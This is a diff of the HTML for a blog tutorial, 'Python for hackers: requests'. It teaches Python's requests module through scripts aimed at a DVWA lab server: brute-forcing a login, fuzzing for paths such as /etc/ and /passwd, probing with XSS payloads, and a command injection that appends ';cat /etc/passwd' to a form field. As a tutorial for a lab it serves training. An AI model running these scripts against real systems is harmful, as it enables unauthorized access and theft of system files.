@@ -13,24 +13,7 @@
 
 
 <meta name="author" content="Yusuf Talha ARABACI">
-<meta name="description" content="
-  Python for Hackers: requests
-  
-    
-    Link to heading
-  
-
-
-
-  Introduction
-  
-    
-    Link to heading
-  
-
-Hello, in this article, we will get to know Python&rsquo;s requests module, where we can write tools in the field of web application security.
-What is ###requests?
-requests is a simple but elegant HTTP module of Python. It allows you to send HTTP requests extremely easily. For requests made with the GET method, you do not need to manually add query strings to your URLs or formally encode your POST data, the requests module takes care of these tasks for you. In this article, we will write various web tools with requests, but let&rsquo;s take a look at the installation first. We assume that you have a basic knowledge of the Python language and continue. If you want, you can also look at the articles about Python on our website.">
+<meta name="description" content="Hello, in this article, we will get to know Python&#39;s requests module, where we can write tools in the field of web application security.">
 <meta name="keywords" content="cybersecurity, infosec, cloud-native security, soc architecture, open source defense, yusuf talha arabaci, malware analysis, pentesting">
 
 
@@ -38,16 +21,12 @@ requests is a simple but elegant HTTP module of Python. It allows you to send HT
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/images/profile.jpeg">
   <meta name="twitter:title" content="Python for hackers: requests">
-  <meta name="twitter:description" content="Python for Hackers: requestsLink to headingIntroductionLink to headingHello, in this article, we will get to know Python’s requests module, where we can write tools in the field of web application security.
-What is ###requests?
-requests is a simple but elegant HTTP module of Python. It allows you to send HTTP requests extremely easily. For requests made with the GET method, you do not need to manually add query strings to your URLs or formally encode your POST data, the requests module takes care of these tasks for you. In this article, we will write various web tools with requests, but let’s take a look at the installation first. We assume that you have a basic knowledge of the Python language and continue. If you want, you can also look at the articles about Python on our website.">
+  <meta name="twitter:description" content="Hello, in this article, we will get to know Python&#39;s requests module, where we can write tools in the field of web application security.">
 
 <meta property="og:url" content="http://localhost:1313/posts/2022/08/python-for-hackers-requests/">
   <meta property="og:site_name" content="Yusuf Talha ARABACI">
   <meta property="og:title" content="Python for hackers: requests">
-  <meta property="og:description" content="Python for Hackers: requestsLink to headingIntroductionLink to headingHello, in this article, we will get to know Python’s requests module, where we can write tools in the field of web application security.
-What is ###requests?
-requests is a simple but elegant HTTP module of Python. It allows you to send HTTP requests extremely easily. For requests made with the GET method, you do not need to manually add query strings to your URLs or formally encode your POST data, the requests module takes care of these tasks for you. In this article, we will write various web tools with requests, but let’s take a look at the installation first. We assume that you have a basic knowledge of the Python language and continue. If you want, you can also look at the articles about Python on our website.">
+  <meta property="og:description" content="Hello, in this article, we will get to know Python&#39;s requests module, where we can write tools in the field of web application security.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -225,7 +204,6 @@ requests is a simple but elegant HTTP module of Python. It allows you to send HT
     <span class="sr-only">Link to heading</span>
   </a>
 </h3>
-<p><img src="https://cdn-images-1.medium.com/max/800/1*a87phGSd-sbfiJLWPfGMxA.png" alt=""></p>
 <h3 id="introduction">
   Introduction
   <a class="heading-link" href="#introduction">
@@ -267,16 +245,16 @@ requests is a simple but elegant HTTP module of Python. It allows you to send HT
 </h4>
 <p><strong>url</strong> is the address of the web page to which we will send the GET or POST request.</p>
 <p><strong>params, data, json, files</strong>These parameters are the parameters/data we will send with GET or POST request. <em>params</em> are used in the get() method and others are used in the post() method. The use of these methods depends on the target site. If the target site does not receive a parameter value, there is no need to use them. If it takes parameters, that is, if it is an HTML form, we need to send the desired data to the <em>name</em> tag values.</p>
-<p><em><strong>params</strong></em>*:* In the get() method, it receives parameters/data in <em>tuple</em> structure.  
-<strong>data:</strong> The post() method takes parameters/data in the <em>tuple</em> structure.  
-<em><strong>json</strong></em>*:* In the post() method, it takes parameters/data in <em>json</em> structure.  
+<p><em><strong>params</strong></em>*:* In the get() method, it receives parameters/data in <em>tuple</em> structure. <br>
+<strong>data:</strong> The post() method takes parameters/data in the <em>tuple</em> structure. <br>
+<em><strong>json</strong></em>*:* In the post() method, it takes parameters/data in <em>json</em> structure. <br>
 <em><strong>files</strong></em>*:* In the post() method, it takes parameters/data in XML or different file types. In the GET request, parameters, that is, data, are added to the rest of the URL. Therefore, we can add parameters by directly editing the URL, or we can give data in the <em>dictionary</em> structure to the <em>params</em> parameter of the get() method. For this:</p>
 <pre tabindex="0"><code>params = {&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;}
 </code></pre><p>We define the parameters in the dictionary structure. When we make a request with these parameters, the parameters are added to the end of the URL as follows.</p>
 <pre tabindex="0"><code>https://httpbin.org/get?key2=value2&amp;key1=value1
 </code></pre><p>Now let&rsquo;s send a GET request by writing a small Python code.</p>
-<pre tabindex="0"><code>import requests  
-params = {&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;}  
+<pre tabindex="0"><code>import requests  
+params = {&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;}  
 response = requests.get(&#39;https://httpbin.org/get&#39;, params=params)
 </code></pre><p>There are different ways to send data via POST request. Data can be sent in dictionary structure or json structure as in GET request: to send data in dictionary structure:</p>
 <pre tabindex="0"><code>data = {&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;}
@@ -289,40 +267,40 @@ response = requests.get(&#39;https://httpbin.org/get&#39;, params=params)
   </a>
 </h4>
 <p>The arguments are the same for the get() and post() methods and are optional.If not used, it is executed with its default values.</p>
-<p><em><strong>allow_redirects(bool)</strong></em>  
-Gets TRUE/FALSE to enable/disable redirection. By default it is TRUE. So it allows redirects. 
-<em><strong>auth(tuple)</strong></em>  
-Used to enable a specific HTTP authentication. Defaults to NULL, does not authenticate  
-<em><strong>cert(tuple)</strong></em>  
-Retrieves a certificate file in <em>tuple</em> structure. By default it takes NULL value. 
-<em><strong>cookies(dict)</strong></em>  
-Retrieves the cookie dictionary to send to the specified url. It does not send cookies by default.  
-<em><strong>headers(dict)</strong></em>  
-Gets the HTTP header to be sent to the specified url. It does not send headers by default.  
-<em><strong>proxies(dict)</strong></em>  
-Retrieves the protocol to be sent to the proxy URL. By default it takes NULL value.  
-<em><strong>stream(bool)</strong></em> Determines whether the response will be downloaded immediately (FALSE) or streamed (TRUE). By default it is FALSE, meaning the response is downloaded immediately.  
-<em><strong>timeout(int)</strong></em> Gets the timeout duration, which represents how many seconds to wait for the client to establish a connection and/or send a response. By default it is NULL, which means the request will continue until the connection is closed  
-<em><strong>verify(bool)</strong></em>  
+<p><em><strong>allow_redirects(bool)</strong></em><br>
+Gets TRUE/FALSE to enable/disable redirection. By default it is TRUE. So it allows redirects.<br>
+<em><strong>auth(tuple)</strong></em><br>
+Used to enable a specific HTTP authentication. Defaults to NULL, does not authenticate <br>
+<em><strong>cert(tuple)</strong></em><br>
+Retrieves a certificate file in <em>tuple</em> structure. By default it takes NULL value.<br>
+<em><strong>cookies(dict)</strong></em><br>
+Retrieves the cookie dictionary to send to the specified url. It does not send cookies by default. <br>
+<em><strong>headers(dict)</strong></em><br>
+Gets the HTTP header to be sent to the specified url. It does not send headers by default. <br>
+<em><strong>proxies(dict)</strong></em><br>
+Retrieves the protocol to be sent to the proxy URL. By default it takes NULL value. <br>
+<em><strong>stream(bool)</strong></em> Determines whether the response will be downloaded immediately (FALSE) or streamed (TRUE). By default it is FALSE, meaning the response is downloaded immediately. <br>
+<em><strong>timeout(int)</strong></em> Gets the timeout duration, which represents how many seconds to wait for the client to establish a connection and/or send a response. By default it is NULL, which means the request will continue until the connection is closed <br>
+<em><strong>verify(bool)</strong></em><br>
 It takes a value of TRUE to verify the TLS certificate of the servers and FALSE to turn off verification. By default it is TRUE.</p>
 <p>####response</p>
 <p>It is the response that the server returns to the request we sent. In the Python codes we wrote, we kept the response we received with the <em>get()</em> method in a variable named <em>response</em>. Now let&rsquo;s examine the content of this answer.</p>
 <pre tabindex="0"><code>print(response.text)
 </code></pre><p>We can print the content of the response as text. A text like the one below will appear.</p>
-<pre tabindex="0"><code>{  
-&#34;args&#34;: {  
-&#34;key1&#34;: &#34;value1&#34;,   
-&#34;key2&#34;: &#34;value2&#34;  
-},   
-&#34;headers&#34;: {  
-&#34;Accept&#34;: &#34;*/*&#34;,   
-&#34;Accept-Encoding&#34;: &#34;gzip, deflate&#34;,   
-&#34;host&#34;: &#34;httpbin.org&#34;,   
-&#34;User-Agent&#34;: &#34;python-requests/2.28.1&#34;,   
-&#34;X-Amzn-Trace-Id&#34;: &#34;Root=1-62e23811-6a7c14dc2c3bc62026eebb0c&#34;  
-},   
-&#34;origin&#34;: &#34;185.51.36.100&#34;,   
-&#34;url&#34;: &#34;https://httpbin.org/get?key1=value1&amp;key2=value2&#34;  
+<pre tabindex="0"><code>{  
+&#34;args&#34;: {  
+&#34;key1&#34;: &#34;value1&#34;,   
+&#34;key2&#34;: &#34;value2&#34;  
+},   
+&#34;headers&#34;: {  
+&#34;Accept&#34;: &#34;*/*&#34;,   
+&#34;Accept-Encoding&#34;: &#34;gzip, deflate&#34;,   
+&#34;host&#34;: &#34;httpbin.org&#34;,   
+&#34;User-Agent&#34;: &#34;python-requests/2.28.1&#34;,   
+&#34;X-Amzn-Trace-Id&#34;: &#34;Root=1-62e23811-6a7c14dc2c3bc62026eebb0c&#34;  
+},   
+&#34;origin&#34;: &#34;185.51.36.100&#34;,   
+&#34;url&#34;: &#34;https://httpbin.org/get?key1=value1&amp;key2=value2&#34;  
 }
 </code></pre><p>Here we see information about the answer we received. Let&rsquo;s also look at the type of response we receive.</p>
 <pre tabindex="0"><code>&gt;&gt;print(type(response))
@@ -336,9 +314,9 @@ It takes a value of TRUE to verify the TLS certificate of the servers and FALSE 
 <pre tabindex="0"><code>print(response.content)
 </code></pre><p>will return us the page source. Now let&rsquo;s make an application that takes the address of the given website and saves its source in an html file.</p>
 <pre tabindex="0"><code>import requests
-</code></pre><pre tabindex="0"><code>response = requests.get(&#39;https://www.google.com.tr&#39;)  
-f = open(&#34;source.html&#34;,&#34;w&#34;)  
-f.write(str(response.content))  
+</code></pre><pre tabindex="0"><code>response = requests.get(&#39;https://www.google.com.tr&#39;)  
+f = open(&#34;source.html&#34;,&#34;w&#34;)  
+f.write(str(response.content))  
 f.close()
 </code></pre><p>You can see that the page source is pulled as follows. (with CSS and Javascript codes)</p>
 <p><img src="https://cdn-images-1.medium.com/max/800/0*W3QQk0ZEoY20GPcY.png" alt=""></p>
@@ -351,20 +329,20 @@ f.close()
   </a>
 </h3>
 <p><a href="https://www.usom.gov.tr/"  class="external-link" target="_blank" rel="noopener">USOM</a>(National Cyber Incident Response Center) is an organization that operates on a 24/7 basis against cyber incidents in our country. It has a list in which it indexes harmful sites on the internet. You can access this list <a href="http://www.usom.gov.tr/url-list.txt"  class="external-link" target="_blank" rel="noopener">here</a>. Now let&rsquo;s try to pull this list with Python.</p>
-<pre tabindex="0"><code>import requests  
-response = requests.get(&#34;http://www.usom.gov.tr/url-list.txt&#34;, verify=False)  
-with open(&#34;usom.txt&#34;, &#34;wb&#34;) as binary_file:  
+<pre tabindex="0"><code>import requests  
+response = requests.get(&#34;http://www.usom.gov.tr/url-list.txt&#34;, verify=False)  
+with open(&#34;usom.txt&#34;, &#34;wb&#34;) as binary_file:  
   binary_file.write(response.content)
 </code></pre><p>We were able to pull this list with a simple GET request. Now, make sure that a URL we have is included in this list.Let&rsquo;s write a function that checks whether it is valid or not.</p>
-<pre tabindex="0"><code>def check(url):  
-  f = open(&#34;usom.txt&#34;)  
-  lines = f.read()  
-  lines = lines.split(&#39;\n&#39;)  
-  for line in lines:  
-    if line == url:  
-    text = url+&#34; is harmful&#34;  
+<pre tabindex="0"><code>def check(url):  
+  f = open(&#34;usom.txt&#34;)  
+  lines = f.read()  
+  lines = lines.split(&#39;\n&#39;)  
+  for line in lines:  
+    if line == url:  
+    text = url+&#34; is harmful&#34;  
     return text
-</code></pre><pre tabindex="0"><code>  text = url+&#34; is not harmful.&#34;  
+</code></pre><pre tabindex="0"><code>  text = url+&#34; is not harmful.&#34;  
   return text
 </code></pre><p>We have created an application that searches for the URL we gave to the function in the text file it finds, and returns it as harmless if it does not find that it is harmful to us.</p>
 <h3 id="brute-force-attack">
@@ -379,18 +357,18 @@ with open(&#34;usom.txt&#34;, &#34;wb&#34;) as binary_file:
 <p>Here I listened to my login page with the <a href="https://portswigger.net/burp"  class="external-link" target="_blank" rel="noopener">burp suite</a> tool. I entered the value &lsquo;aa&rsquo; in the username and password fields and pressed the login button. The GET request was captured in the HTTP History section on my burp tool. Of course, you can also use different tools for this. We will use some of the information here. First of all, since we access the DVWA page by logging in, our Python application also needs to access the session somehow. So what is a session? To put it briefly, when we log in from a login page with our username/password information, we actually start a session. The session is terminated when we finish our work and close our browser or when a certain amount of time has passed. Web applications use cookies when creating a session; two cookies are created, one on the client computer and one on the server. The session continues as long as both cookies are not lost. Here, we will log in to the DVWA page and give the session cookie we received to our Python application, allowing it to access the web page with our session. The field marked in the Burp tool ‘PHPSESID’ is our session cookie. But we better hurry, the session is running out…</p>
 <pre tabindex="0"><code>import requests
 </code></pre><pre tabindex="0"><code>header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91&#34;} #We give the session cookie to the header.
-</code></pre><pre tabindex="0"><code>usernames = [&#34;admin&#34;, &#34;root&#34;, &#34;user&#34;, &#34;aa&#34;] #list of usernames we will use in the experiments  
+</code></pre><pre tabindex="0"><code>usernames = [&#34;admin&#34;, &#34;root&#34;, &#34;user&#34;, &#34;aa&#34;] #list of usernames we will use in the experiments  
 passwords = [&#34;resu&#34;, &#34;password&#34;, &#34;toor&#34;, &#34;1234&#34;] #list of passwords we will use in the tests
-</code></pre><pre tabindex="0"><code>for i in usernames:  
-  for j in passwords:  
-    url = f&#34;http://10.0.2.4/dvwa/vulnerabilities/brute/?username={i}&amp;password={j}&amp;Login=Login&#34;  
-    #Since our application works with GET request, we can try it by adding username and password information to the URL.  
-    result = requests.get(url=url, headers=header)  
-    if not &#34;Username and/or password incorrect&#34; in str(result.content):  
-      print(&#34;Username: &#34;, i)  
-      print(&#34;password: &#34;, j)  
-      print(&#34;Status code: &#34;,result.status_code)  
-      print(&#34;Length: &#34;, len(result.content))  
+</code></pre><pre tabindex="0"><code>for i in usernames:  
+  for j in passwords:  
+    url = f&#34;http://10.0.2.4/dvwa/vulnerabilities/brute/?username={i}&amp;password={j}&amp;Login=Login&#34;  
+    #Since our application works with GET request, we can try it by adding username and password information to the URL.  
+    result = requests.get(url=url, headers=header)  
+    if not &#34;Username and/or password incorrect&#34; in str(result.content):  
+      print(&#34;Username: &#34;, i)  
+      print(&#34;password: &#34;, j)  
+      print(&#34;Status code: &#34;,result.status_code)  
+      print(&#34;Length: &#34;, len(result.content))  
       print(&#34;Username and Password is found&#34;)
 </code></pre><p><img src="https://cdn-images-1.medium.com/max/800/0*WFaG5gXYv4_u5frj.png" alt=""></p>
 <p>When we write the code in the python file and run it, it will make tests by sending GET requests to the live DVWA server.</p>
@@ -404,14 +382,14 @@ passwords = [&#34;resu&#34;, &#34;password&#34;, &#34;toor&#34;, &#34;1234&#34;]
 </h3>
 <p>In the URL Fuzzing process, a list of possible file/directory names is created and an http request is sent to the system. In this way, directories and files on the server are tried to be found. Of course, doing this process manually by trying it one by one is tiring. How about writing a little python code for this?</p>
 <pre tabindex="0"><code>import requests
-</code></pre><pre tabindex="0"><code>fuzzing_list = [&#39;/robots.txt&#39;,&#39;/etc/&#39;,&#39;/dvwa/&#39;,&#39;/passwd&#39;,&#39;/usr/&#39;,&#39;/index.php&#39;] #list to search  
+</code></pre><pre tabindex="0"><code>fuzzing_list = [&#39;/robots.txt&#39;,&#39;/etc/&#39;,&#39;/dvwa/&#39;,&#39;/passwd&#39;,&#39;/usr/&#39;,&#39;/index.php&#39;] #list to search  
 header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6&#34;} Our session cookie on #dvwa
-</code></pre><pre tabindex="0"><code>for i in fuzzing_list:  
-  url = &#34;http://10.0.2.4&#34;+str(i) #We are trying to fuzz the rest of the dvwa server&#39;s IP address  
-  result = requests.get(url = url, headers = header)  
-  if &#34;200&#34; in str(result.status_code):  
-    print(&#34;file or directory is found: &#34;,i)  
-  else:  
+</code></pre><pre tabindex="0"><code>for i in fuzzing_list:  
+  url = &#34;http://10.0.2.4&#34;+str(i) #We are trying to fuzz the rest of the dvwa server&#39;s IP address  
+  result = requests.get(url = url, headers = header)  
+  if &#34;200&#34; in str(result.status_code):  
+    print(&#34;file or directory is found: &#34;,i)  
+  else:  
     print(&#34;file or directory isn&#39;t found: &#34;,i)
 </code></pre><p>When we run the Python code, it will try the directory and file names in the list and give us the following result.</p>
 <p><img src="https://cdn-images-1.medium.com/max/800/0*P0_DM5nuoLcNWX16.png" alt=""></p>
@@ -425,12 +403,12 @@ header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=0k6634cfi19e5sfn2vb754u
 <p>XSS** is a security vulnerability that occurs when values taken from web page inputs are included in the page source without filtering. This is because harmful javascript codes may be included in the page from unfiltered input. There are many XSS scripts that can reveal this vulnerability. You can access a list I found on Github <a href="https://github.com/payloadbox/xss-payload-list"  class="external-link" target="_blank" rel="noopener">here</a>. In this application, we will make an application that checks whether the values in a list containing XSS scripts are added to the page source by sending them to the page. For this, I gave the session cookie we made in the previous application to the header variable again, I will not explain this part again.</p>
 <p>Our DVWA page works with GET request again, so we will use the <em>requests.get()</em> function. What we write in the input section is written in the <em>name</em> section of the URL. Based on this, we will give our XSS scripts to the <em>name</em> parameter.</p>
 <pre tabindex="0"><code>import requests
-</code></pre><pre tabindex="0"><code>header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91&#34;}  
+</code></pre><pre tabindex="0"><code>header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91&#34;}  
 xss_list = [&#34;&lt;h1&gt;xss&lt;/h1&gt;&#34;,&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;,&#34;&lt;script&gt;prompt(&#39;xss&#39;)&lt;/script&gt;&#34;,&#34;XSS&#34;,&#34;alert(&#39;xss&#39;)&#34;]
-</code></pre><pre tabindex="0"><code>for payload in xss_list:  
-  url=&#34;http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=&#34;+payload Giving scripts to the #name parameter  
-  result = requests.get(url=url, headers=header) # Making the GET request  
-  if str(payload) in str(result.content):  
+</code></pre><pre tabindex="0"><code>for payload in xss_list:  
+  url=&#34;http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=&#34;+payload Giving scripts to the #name parameter  
+  result = requests.get(url=url, headers=header) # Making the GET request  
+  if str(payload) in str(result.content):  
     print(&#34;Possible XSS found: &#34;+str(payload))
 </code></pre><p>When we write the code in the python file and run it, it will make tests by sending GET requests to the live DVWA server.</p>
 <p><img src="https://cdn-images-1.medium.com/max/800/0*5GN1pw6l0XKQVsRQ.png" alt=""></p>
@@ -448,12 +426,12 @@ xss_list = [&#34;&lt;h1&gt;xss&lt;/h1&gt;&#34;,&#34;&lt;script&gt;alert(&#39;xss
 <p><img src="https://cdn-images-1.medium.com/max/800/0*64jFt9fe7MaTcEu7.png" alt=""></p>
 <p>When we listen to the request we sent to the page with burp, we can see that this request was made with a POST method and the parameters sent. As we did in previous applications, we will give our session cookie (&lsquo;PHPSESSID) to our header parameter. Next, since it is a POST request, we will create a data tuple structure and give it to our post() method.</p>
 <pre tabindex="0"><code>import requests
-</code></pre><pre tabindex="0"><code>command = &#34;cat /etc/passwd&#34; #the command we want to run  
-header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6&#34;} #session cookie  
-url = &#34;http://10.0.2.4/dvwa/vulnerabilities/exec/&#34; #web address we will attack  
-data = {&#34;ip&#34;:&#34;127.0.0.1;&#34;+command,&#34;Submit&#34;:&#34;Submit&#34;} The parameters we will send with the #POST method  
+</code></pre><pre tabindex="0"><code>command = &#34;cat /etc/passwd&#34; #the command we want to run  
+header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6&#34;} #session cookie  
+url = &#34;http://10.0.2.4/dvwa/vulnerabilities/exec/&#34; #web address we will attack  
+data = {&#34;ip&#34;:&#34;127.0.0.1;&#34;+command,&#34;Submit&#34;:&#34;Submit&#34;} The parameters we will send with the #POST method  
 response = requests.post(url=url, data=data, headers=header) #sending the request
-</code></pre><pre tabindex="0"><code>if &#34;www-data&#34; in str(response.content):  
+</code></pre><pre tabindex="0"><code>if &#34;www-data&#34; in str(response.content):  
   print(&#34;command injection vulnerability found!&#34;)
 </code></pre><p>&lsquo;www-data&rsquo; consists of a string that we can understand that the command is working when it is found in the response, it is located in the passwd file. Using this method, you can run longer commands sequentially with Python.</p>
 <p><img src="https://cdn-images-1.medium.com/max/800/0*HJlxB5W113qQFTkD.png" alt=""></p>
